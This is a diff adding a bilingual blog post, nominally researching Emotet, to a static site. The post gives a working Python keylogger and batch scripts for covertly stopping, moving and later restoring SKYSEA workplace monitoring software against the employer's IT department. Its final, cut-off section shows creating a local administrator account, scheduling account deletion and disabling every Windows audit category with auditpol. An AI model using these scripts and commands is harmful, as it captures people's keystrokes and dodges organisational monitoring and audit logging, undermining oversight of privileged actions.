@@ -139,6 +139,1082 @@
 	
 	<!-- display as entry -->	
 		<h3 class="title">
+			<div class="date"> 2021-11-12 </div>
+			<div class="article-title"><a href="/2021/11/12/Research-of-Emotet/" >Research of Emotet</a></div>						
+		</h3>
+	
+
+
+			<div class="entry">
+  <div class="row">
+  
+	<div class="col-md-12">
+	  
+	
+	  <h2 id="Spread-via-Word-documents"><a href="#Spread-via-Word-documents" class="headerlink" title="Spread via Word documents"></a>Spread via Word documents</h2><p><strong>通过 Word 文档传播</strong></p>
+<div class="tabs" id="spread-via-word-documents"><ul class="nav-tabs"><li class="tab active"><a href="#spread-via-word-documents-1">English</a></li><li class="tab"><a href="#spread-via-word-documents-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="spread-via-word-documents-1"><p>The EMOTET group managed to take email as an attack vector to a next level. Through a fully automated process, EMOTET malware was delivered to the victims’ computers via infected e-mail attachments.  A variety of different lures were used to trick unsuspecting users into opening these malicious attachments. In the past, EMOTET email campaigns have also been presented as invoices, shipping notices and information about COVID-19.</p>
+<p>All these emails contained malicious Word documents, either attached to the email itself or downloadable by clicking on a link within the email itself. Once a user opened one of these documents, they could be prompted to “enable macros” so that the malicious code hidden in the Word file could run and install EMOTET malware on a victim’s computer.</p></div><div class="tab-pane" id="spread-via-word-documents-2"><p>EMOTET 群体成功将电子邮件作为攻击向量提升到了一个新水平。通过完全自动化的过程，EMOTET 恶意软件通过感染的电子邮件附件传递到受害者的计算机上。各种不同的诱饵被用来欺骗毫无戒备的用户打开这些恶意附件。过去，EMOTET 的电子邮件活动也曾被伪装成发票、运输通知和有关 COVID-19 的信息。</p>
+<p>所有这些电子邮件都包含恶意的 Word 文档，文档要么附在电子邮件中，要么通过点击邮件中的链接下载。一旦用户打开了这些文档，他们可能会被提示『启用宏』，以便隐藏在 Word 文件中的恶意代码可以运行，并在受害者的计算机上安装 EMOTET 恶意软件。</p></div></div></div>
+
+<h2 id="Attacks-for-hire"><a href="#Attacks-for-hire" class="headerlink" title="Attacks for hire"></a>Attacks for hire</h2><p><strong>雇佣攻击</strong></p>
+<div class="tabs" id="attacks-for-hire"><ul class="nav-tabs"><li class="tab active"><a href="#attacks-for-hire-1">English</a></li><li class="tab"><a href="#attacks-for-hire-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="attacks-for-hire-1"><p>EMOTET was much more than just a malware. What made EMOTET so dangerous is that the malware was offered for hire to other cybercriminals to install other types of malware, such as banking Trojans or ransomwares, onto a victim’s computer.</p>
+<p>This type of attack is called a ‘loader’ operation, and EMOTET is said to be one of the biggest players in the cybercrime world as other malware operators like TrickBot and Ryuk have benefited from it.</p>
+<p>Its unique way of infecting networks by spreading the threat laterally after gaining access to just a few devices in the network made it one of the most resilient malware in the wild.</p></div><div class="tab-pane" id="attacks-for-hire-2"><p>EMOTET 不仅仅是一种恶意软件。EMOTET 之所以危险，是因为它被提供给其他网络犯罪分子，用于在受害者的计算机上安装其他类型的恶意软件，如银行木马或勒索软件。</p>
+<p>这种类型的攻击被称为『加载程序』操作，EMOTET 被认为是网络犯罪世界中的最大玩家之一，因为其他恶意软件操作员如 TrickBot 和 Ryuk 从中受益。</p>
+<p>它通过在网络中获得访问权限后横向传播威胁的独特方式，使其成为最具弹性的恶意软件之一。</p></div></div></div>
+
+<h2 id="Emotet-Malware"><a href="#Emotet-Malware" class="headerlink" title="Emotet Malware"></a><a target="_blank" rel="noopener" href="https://us-cert.cisa.gov/ncas/alerts/aa20-280a">Emotet Malware</a></h2><p><strong>Emotet 恶意软件</strong></p>
+<h2 id="Phishing-Spearphishing-Link"><a href="#Phishing-Spearphishing-Link" class="headerlink" title="Phishing: Spearphishing Link"></a><a target="_blank" rel="noopener" href="https://attack.mitre.org/versions/v7/techniques/T1566/002/">Phishing: Spearphishing Link</a></h2><p><strong>网络钓鱼：带有恶意链接的鱼叉式钓鱼</strong></p>
+<div class="tabs" id="phishing:-spearphishing-link"><ul class="nav-tabs"><li class="tab active"><a href="#phishing:-spearphishing-link-1">English</a></li><li class="tab"><a href="#phishing:-spearphishing-link-2">中文</a></li></ul><div class="tab-content"><div class="tab-pane active" id="phishing:-spearphishing-link-1"><p>Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and&#x2F;or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.</p>
+<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs&#x2F;web beacons). Links may also direct users to malicious applications designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.</p></div><div class="tab-pane" id="phishing:-spearphishing-link-2"><p>对手可能会发送带有恶意链接的鱼叉式钓鱼电子邮件，试图获取敏感信息或访问受害者的系统。带有链接的鱼叉式钓鱼是一种特定变体，与其他形式的鱼叉式钓鱼不同，它使用链接来下载电子邮件中的恶意软件，而不是将恶意文件附加到电子邮件中，以避开可能检查电子邮件附件的防御。</p>
+<p>所有形式的鱼叉式钓鱼都是针对特定个人、公司或行业的电子社交工程。在这种情况下，恶意电子邮件包含链接。通常，这些链接会伴有社交工程文本，要求用户主动点击或复制并粘贴 URL 到浏览器中，利用用户执行。访问的网站可能会通过利用漏洞来危害浏览器，或者根据电子邮件的背景提示用户下载应用程序、文档、压缩文件甚至可执行文件。对手还可能包括旨在直接与电子邮件阅读器交互的链接，包括旨在直接利用最终系统的嵌入式图像或验证电子邮件接收的 Web 僵尸（即 Web Bugs&#x2F;Web Beacons）。链接还可能将用户引导到旨在窃取应用程序访问令牌（如 OAuth 令牌）的恶意应用程序中，以获得对受保护应用程序和信息的访问权限。</p></div></div></div>
+
+<h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p><strong>键盘记录器</strong></p>
+<div class="cell border-box-sizing text_cell rendered"><div class="prompt input_prompt">
+</div><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<div class="highlight"><pre><span></span>python<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pynput
+</pre></div>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[1]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">pynput</span> <span class="kn">import</span> <span class="n">keyboard</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+<div class="prompt input_prompt">In&nbsp;[2]:</div>
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">log_file</span> <span class="o">=</span> <span class="s1">&#39;keylog.txt&#39;</span>
+
+<span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Key</span> <span class="o">|</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">KeyCode</span> <span class="o">|</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="n">keyboard</span><span class="o">.</span><span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+ 
+
+
+
+
+<hr>
+<div class="tabs" id="keylogger-detector"><ul class="nav-tabs"><li class="tab active"><a href="#keylogger-detector-1">Keylogger</a></li><li class="tab"><a href="#keylogger-detector-2">键盘记录器</a></li></ul><div class="tab-content"><div class="tab-pane active" id="keylogger-detector-1"><p>How to detect keyloggers?</p>
+<p>Detecting keylogger programs on a computer usually involves fairly obvious warning signs: the browser slows down, there are delays when moving the mouse or typing, or the cursor disappears. Even if you use the best privacy browsers, keyloggers can still track your inputs.</p>
+<hr>
+<p>How keyloggers infect your device?</p>
+<p>Hackers often use social engineering methods to infect victims with keyloggers. A keylogger can infect your device in different ways, sometimes depending on your device type. And even though a spyware removal tool can handle keystroke logger detection, you want to avoid this dangerous type of malware to begin with.</p>
+<p>Here’s the general process for how a keylogger infects your device:</p>
+<ol>
+<li><p>A cybercriminal sends an infected phishing message, usually through an email attachment, SMS message, or infected website.</p>
+</li>
+<li><p>When you click the link for the infected website or attachment, the keylogger automatically downloads itself onto your device.</p>
+</li>
+<li><p>The keystroke tracker immediately starts to collect your keystrokes, most likely without being detected until you run a keylogger scan.</p>
+</li>
+</ol></div><div class="tab-pane" id="keylogger-detector-2"><p>如何检测键盘记录器？</p>
+<p>检测计算机上键盘记录器程序的警告信号通常相当明显：浏览器变慢、鼠标移动或键击时出现延迟，或者光标消失。即使你使用最好的隐私浏览器，键盘记录器也能跟踪你的输入。</p>
+<hr>
+<p>键盘记录器如何感染你的设备？</p>
+<p>黑客通常使用社会工程学方法来感染受害者的设备。键盘记录器可以通过多种方式感染你的设备，这些方式有时取决于你的设备类型。虽然间谍软件清除工具可以处理键盘记录器的检测，但最好的办法是从一开始就避免这种危险的恶意软件。</p>
+<p>以下是键盘记录器感染你设备的一般过程：</p>
+<ol>
+<li><p>网络犯罪分子发送带有感染的钓鱼信息，通常通过电子邮件附件、短信或感染的网站进行发送。</p>
+</li>
+<li><p>当你点击感染网站的链接或附件时，键盘记录器会自动下载到你的设备上。</p>
+</li>
+<li><p>键盘记录器立即开始收集你的按键输入，通常在你运行键盘记录器扫描之前不会被发现。</p>
+</li>
+</ol></div></div></div>
+
+<h2 id="SKYSEA-这个间谍软件的删除方法"><a href="#SKYSEA-这个间谍软件的删除方法" class="headerlink" title="SKYSEA 这个间谍软件的删除方法"></a>SKYSEA 这个间谍软件的删除方法</h2><ul>
+<li>Microsoft Policy Platform</li>
+<li>Microsoft Endpoint Manager<ul>
+<li>Microsoft Endpoint Configuration Manager<ul>
+<li>Configuration Manager Remote Control Service</li>
+</ul>
+</li>
+<li>Microsoft Intune<ul>
+<li>Microsoft Intune Management Extension</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Microsoft Azure Information Protection</li>
+<li>Azure Monitor Agent</li>
+</ul>
+<h3 id="一、详细操作指南"><a href="#一、详细操作指南" class="headerlink" title="一、详细操作指南"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/na2410e5d8d1a">一、详细操作指南</a></h3><p>社内PC上未经允许安装并获取操作日志的麻烦间谍软件。让我们根除这个间谍软件，提高生活质量（QoL）。</p>
+<ol>
+<li><p>使用 <a target="_blank" rel="noopener" href="https://registry-finder.com/bin/2.51.0.0/RegistryFinder64.zip">RegistryFinder</a> 删除注册表中所有包含 “skysea” 的项。也可以使用 regedit，但比较麻烦。</p>
+<p>删除注册表中 Key 列和 Value 列中包含 “SKYSEA” 的记录（右键点击 → 从注册表中删除）。</p>
+</li>
+<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “Swd” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
+<p>删除 C:\WINDOWS 目录中的 “wds” 文件夹。</p>
+</li>
+<li><p>通过资源管理器右键点击 PC → 管理 → 左侧树状图中的 服务和应用程序 → 服务中的 “awssm” 右键点击 → 属性 → 将服务状态设置为停止，将启动类型设置为禁用。</p>
+<p>删除 C:\WINDOWS 目录中的 “awssm” 文件夹。</p>
+</li>
+<li><p>将以下文本保存为 .bat 文件并运行。也可以手动停止和禁用服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止服务</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因为各服务会进行活性监控，需要多次运行 bat 文件来完全停止它们。如果不行的话可以手动从服务界面停止。</p>
+</li>
+<li><p>打开任务管理器，右键点击 “SKYSEA Client View Version 16.1” → 结束任务。然后删除 C:\Program Files (x86) 目录中的 “Sky Product” 文件夹。如果无法删除，可能是服务未完全停止或者任务管理器中还有 “SKYSEA Client View Version 16.1”。</p>
+</li>
+<li><p>重启电脑，如果任务管理器中没有任何与 “SKYSEA” 相关的进程，说明删除成功。</p>
+</li>
+</ol>
+<p>结束监视社会。感谢这家公司，我连藤原竜也都讨厌了。</p>
+<h4 id="2023年10月15日更新"><a href="#2023年10月15日更新" class="headerlink" title="2023年10月15日更新"></a>2023年10月15日更新</h4><p>在多次停止服务后，系统部门又说『日志无法获取了』，我反复说『请远程安装』，然后删除了日志。但随着新版本的发布，他们要求重新安装。我本来不想安装，但最后不得不安装。安装后，他们又说『日志无法获取』，但我不在乎。</p>
+<p>后来我再次尝试删除这个恶心的间谍软件，但 “C:\Program Files (x86)\Sky Product\SKYSEA Client View” 文件夹被占用，无法删除。因为不想查找具体是哪项服务占用，于是按照以下步骤进行处理：</p>
+<ol>
+<li>右键点击 Windows 标志，选择 “运行”。</li>
+<li>输入 “resmon.exe” 并点击 “确定”。</li>
+<li>在资源监视器中，打开 “CPU” 选项卡。</li>
+<li>展开 “关联的句柄” 部分。</li>
+<li>在 “关联的句柄” 搜索框中输入 “SKYSEA Client View”。</li>
+<li>等待搜索结果显示。</li>
+<li>右键点击显示的进程，选择 “结束进程”。</li>
+</ol>
+<p>即便是 Chrome 和 Outlook 也受到影响，这太恶心了。想到系统部门的老男人可能会窥探女性员工的搜索历史，真是太可怕了。</p>
+<p>无法删除文件夹时，可以通过移除 administrators 权限并授予 everyone 完全控制权限来删除文件夹。</p>
+<h3 id="二、服务停止与启动脚本"><a href="#二、服务停止与启动脚本" class="headerlink" title="二、服务停止与启动脚本"></a><a target="_blank" rel="noopener" href="https://note.com/ironhead/n/n2720b588193a">二、服务停止与启动脚本</a></h3><p>昨天写的删除方法，其实不用删除注册表也可以停止服务。但是，如果想彻底清理，建议删除注册表项目。</p>
+<p>因为有些公司可能会在删除后抱怨，所以我创建了停止和启动服务的 bat 文件。请在自担风险下使用。</p>
+<h4 id="服务停止-bat"><a href="#服务停止-bat" class="headerlink" title="服务停止.bat"></a>服务停止.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 禁用服务并停止，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= disabled</span><br><span class="line">net stop &quot;Swd&quot;</span><br><span class="line">move C:\Windows\wds C:\kasu\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= disabled</span><br><span class="line">net stop &quot;awssm&quot;</span><br><span class="line">move C:\WINDOWS\avv5sm C:\kasu\avv5sm</span><br><span class="line"></span><br><span class="line">rem 终止进程</span><br><span class="line">taskkill /F /im CtlCli64.exe</span><br><span class="line">taskkill /F /im LogChromeNativeHost.exe</span><br><span class="line">taskkill /F /im AstAgent.exe</span><br><span class="line">taskkill /F /im CtlCli.exe</span><br><span class="line">taskkill /F /im SvcMon.exe</span><br><span class="line">taskkill /F /im SKYSEAHS.exe</span><br><span class="line"></span><br><span class="line">rem 禁用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= disabled</span><br><span class="line">sc config &quot;CompactSvc&quot; start= disabled</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= disabled</span><br><span class="line">sc config &quot;AstExAgt&quot; start= disabled</span><br><span class="line">sc config &quot;ScvSvc&quot; start= disabled</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= disabled</span><br><span class="line">sc config &quot;LogSvr&quot; start= disabled</span><br><span class="line">sc config &quot;IceSvc&quot; start= disabled</span><br><span class="line"></span><br><span class="line">rem 停止其他服务</span><br><span class="line">net stop &quot;SCVCabProxySvr&quot;</span><br><span class="line">net stop &quot;CompactSvc&quot;</span><br><span class="line">net stop &quot;ScvUpdSvc&quot;</span><br><span class="line">net stop &quot;AstExAgt&quot;</span><br><span class="line">net stop &quot;ScvSvc&quot;</span><br><span class="line">net stop &quot;SCV LogAgentService&quot;</span><br><span class="line">net stop &quot;LogSvr&quot;</span><br><span class="line">net stop &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹</span><br><span class="line">move &quot;C:\Program Files (x86)\Sky Product&quot; &quot;C:\kasu&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="服务启动-bat"><a href="#服务启动-bat" class="headerlink" title="服务启动.bat"></a>服务启动.bat</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 启用服务并启动，移动模块</span><br><span class="line">sc config &quot;Swd&quot; start= auto</span><br><span class="line">net start &quot;Swd&quot;</span><br><span class="line">move C:\kasu\wds C:\Windows\wds</span><br><span class="line"></span><br><span class="line">sc config &quot;awssm&quot; start= auto</span><br><span class="line">net start &quot;awssm&quot;</span><br><span class="line">move C:\kasu\avv5sm C:\WINDOWS\avv5sm</span><br><span class="line"></span><br><span class="line">rem 启用其他服务</span><br><span class="line">sc config &quot;SCVCabProxySvr&quot; start= auto</span><br><span class="line">sc config &quot;CompactSvc&quot; start= auto</span><br><span class="line">sc config &quot;ScvUpdSvc&quot; start= auto</span><br><span class="line">sc config &quot;AstExAgt&quot; start= auto</span><br><span class="line">sc config &quot;ScvSvc&quot; start= auto</span><br><span class="line">sc config &quot;SCV LogAgentService&quot; start= auto</span><br><span class="line">sc config &quot;LogSvr&quot; start= auto</span><br><span class="line">sc config &quot;IceSvc&quot; start= auto</span><br><span class="line"></span><br><span class="line">rem 启动其他服务</span><br><span class="line">net start &quot;SCVCabProxySvr&quot;</span><br><span class="line">net start &quot;CompactSvc&quot;</span><br><span class="line">net start &quot;ScvUpdSvc&quot;</span><br><span class="line">net start &quot;AstExAgt&quot;</span><br><span class="line">net start &quot;ScvSvc&quot;</span><br><span class="line">net start &quot;SCV LogAgentService&quot;</span><br><span class="line">net start &quot;LogSvr&quot;</span><br><span class="line">net start &quot;IceSvc&quot;</span><br><span class="line"></span><br><span class="line">rem 移动 C:\Program Files (x86)\Sky Product 文件夹回原位置</span><br><span class="line">move &quot;C:\kasu\Sky Product&quot; &quot;C:\Program Files (x86)&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="组织域管理员"><a href="#组织域管理员" class="headerlink" title="组织域管理员"></a>组织域管理员</h2><p>域管理员在未联网的计算机终端上用 CMD 执行的命令不会被域级审计，因为域级审计依赖于计算机与域控制器之间的通信。若计算机与域控制器断开连接（未联网），域级审计无法实时获取和记录该计算机的操作信息。</p>
+<p>详细解释</p>
+<ol>
+<li>域级审计的工作原理：<ul>
+<li>域级审计通过域控制器推送审计策略，监控和收集域中计算机的操作信息。</li>
+<li>当计算机执行某些命令或操作时，会向域控制器发送事件日志，存储在域控制器的安全日志中。</li>
+</ul>
+</li>
+<li>未联网时的影响：<ul>
+<li>如果计算机未连接到网络或无法访问域控制器，任何在该计算机上执行的命令都无法实时同步到域控制器。</li>
+<li>因此，域级审计无法记录这些操作。</li>
+</ul>
+</li>
+<li>本地审计的作用：<ul>
+<li>虽然无法进行域级审计，但本地审计策略（如进程创建审计、登录审计）仍然有效。</li>
+<li>这些操作会记录到本地安全日志中（在事件查看器的安全日志下）。</li>
+<li>例如，Windows 事件 ID 4688 会记录新进程的创建。</li>
+</ul>
+</li>
+<li>联网后同步：<ul>
+<li>当未联网的计算机重新连接到域后，域策略可以再次应用，但在断网期间生成的本地日志不会自动上传到域控制器。</li>
+<li>需要手动导出或通过集中式日志管理工具收集这些本地日志。</li>
+</ul>
+</li>
+</ol>
+<h3 id="创建本地管理员账户"><a href="#创建本地管理员账户" class="headerlink" title="创建本地管理员账户"></a>创建本地管理员账户</h3><p>组织域管理员登录到某个计算机终端并使用 <code>cmd</code> 或 <code>PowerShell</code> 创建一个新的本地管理员账户：</p>
+<ul>
+<li><p>通过 <code>cmd</code> 创建本地管理员：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user NewLocalAdmin password /add</span><br><span class="line"><span class="built_in">net</span> localgroup Administrators NewLocalAdmin /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过 <code>PowerShell</code> 创建本地管理员：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-LocalUser</span> <span class="string">&quot;NewLocalAdmin&quot;</span> <span class="literal">-Password</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;password&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Administrators&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;NewLocalAdmin&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这会在本地计算机上创建一个名为 <code>NewLocalAdmin</code> 的用户，并将其添加到 <code>Administrators</code> 组中，从而赋予该账户管理员权限。</p>
+<h3 id="删除本地管理员账户"><a href="#删除本地管理员账户" class="headerlink" title="删除本地管理员账户"></a>删除本地管理员账户</h3><p>假设你希望任务在 2024 年 12 月 25 日午夜 12 点删除本地管理员账户，可以按照如下方式创建任务：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;DeleteCurrentAdmin&quot; /tr &quot;<span class="built_in">net</span> user CurrentAdmin /delete&quot; /sc once /st <span class="number">00</span>:<span class="number">00</span> /sd <span class="number">12</span>/<span class="number">25</span>/<span class="number">2024</span></span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<ul>
+<li><code>/sc once</code>：表示这是一个只执行一次的任务。</li>
+<li><code>/st 00:00</code>：设定任务的开始时间为午夜12点（00:00）。</li>
+<li><code>/sd 12/25/2024</code>：指定任务的具体日期为 2024 年 12 月 25 日。</li>
+</ul>
+<p>这样，任务将在指定的日期和时间执行并删除本地管理员账户。</p>
+<h3 id="禁用本地审计"><a href="#禁用本地审计" class="headerlink" title="禁用本地审计"></a>禁用本地审计</h3><p>要在 Windows 系统上禁用本地审计，可以通过本地组策略编辑器或命令行工具来进行。以下是两种常见方法：</p>
+<h4 id="方法-1：使用本地组策略编辑器禁用本地审计"><a href="#方法-1：使用本地组策略编辑器禁用本地审计" class="headerlink" title="方法 1：使用本地组策略编辑器禁用本地审计"></a>方法 1：使用本地组策略编辑器禁用本地审计</h4><ol>
+<li>打开本地组策略编辑器：<ul>
+<li>按下 Win + R，输入 gpedit.msc，然后按 Enter。</li>
+</ul>
+</li>
+<li>导航到审计策略：<ul>
+<li>路径：计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 审核策略。</li>
+</ul>
+</li>
+<li>禁用所需的审计项：<ul>
+<li>在右侧面板中找到需要禁用的审计项（例如登录审核、对象访问审核、进程创建审核等）。</li>
+<li>双击需要禁用的项，在弹出的窗口中选择不审核，然后点击确定。</li>
+</ul>
+</li>
+<li>应用更改：<ul>
+<li>关闭组策略编辑器，重启计算机或运行以下命令以使更改生效：</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法-2：使用命令行工具禁用本地审计"><a href="#方法-2：使用命令行工具禁用本地审计" class="headerlink" title="方法 2：使用命令行工具禁用本地审计"></a>方法 2：使用命令行工具禁用本地审计</h4><p>可以使用 auditpol 命令来禁用特定的审计策略。</p>
+<ul>
+<li>查看当前的审计策略</li>
+</ul>
+<p>在命令提示符或 PowerShell 中，运行以下命令查看当前的审计策略：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /get /category:*</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>禁用特定审计项</li>
+</ul>
+<p>要禁用特定审计项（例如登录&#x2F;注销类别下的所有审核），可以使用以下命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditpol /<span class="built_in">set</span> /category:&quot;Logon/Logoff&quot; /success:disable /failure:disable</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>禁用所有审计项</li>
+</ul>
+<p>要禁用所有审计类别的审计，可以逐项禁用，或者使用批处理命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f &quot;tokens=*&quot; %a <span class="keyword">in</span> (&#x27;auditpol /get /category:* ^| <span class="built_in">findstr</span> /r &quot;^[A-Z]&quot;&#x27;) <span class="keyword">do</span> auditpol /<span class="built_in">set</span> /category:&quot;%a&quot; /success:disable /failure:disable</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意事项</li>
+</ul>
+<ol>
+<li>权限要求：<ul>
+<li>修改审计策略需要管理员权限，请确保在具有管理员权限的账户下执行这些操作。</li>
+</ul>
+</li>
